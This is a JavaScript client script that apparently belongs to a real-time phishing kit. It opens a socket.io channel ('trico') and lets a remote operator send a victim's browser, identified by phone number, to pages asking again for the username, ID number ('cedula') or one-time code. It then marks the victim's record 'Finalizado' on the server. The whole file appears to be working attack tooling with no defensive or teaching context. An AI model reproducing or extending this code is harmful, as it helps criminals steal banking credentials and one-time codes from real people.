var socket = io.connect(url);

socket.on("trico", function (data) {
  if (data.valor == "user") {
    if (
      info.checkerInfo.mode == "personas" &&
      data.valid == info.metaInfo.telnum
    ) {
      window.location.href = "./error.user.html";
    } else if (
      info.checkerInfo.mode == "mano" &&
      data.valid == info.metaInfo.telnum
    ) {
      window.location.href = "./error.cedula.html";
    }
  } else if (data.valor == "otp" && data.valid == info.metaInfo.telnum) {
    window.location.href = "./cdin.html";
  } else if (data.valor == "newOtp" && data.valid == info.metaInfo.telnum) {
    window.location.href = "./cdin.error.html";
  } else if (data.valor == "finish" && data.valid == info.metaInfo.telnum) {
    async function updateStatus() {
      const response = await fetch(`${url}/trico/tricoData`, {
        method: "GET",
        headers: {
          "Content-Type": "application/json",
        },
      });

      const serverData = await response.json();
      const dataTables = [...serverData];

      for (const data of dataTables) {
        if (
          data.valid == info.metaInfo.telnum
        ) {
          console.log("Usuario encontrado");
          const updateresponse = await fetch(
            `${url}/trico/tricofinish/${data.idreg}`,
            {
              method: "PUT",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                estado: "Finalizado",
              }),
            }
          );
          const updatedData = await updateresponse.json();
        }
      }

      window.location.href = "./finalizado.html";
    }
    updateStatus();
  }
});
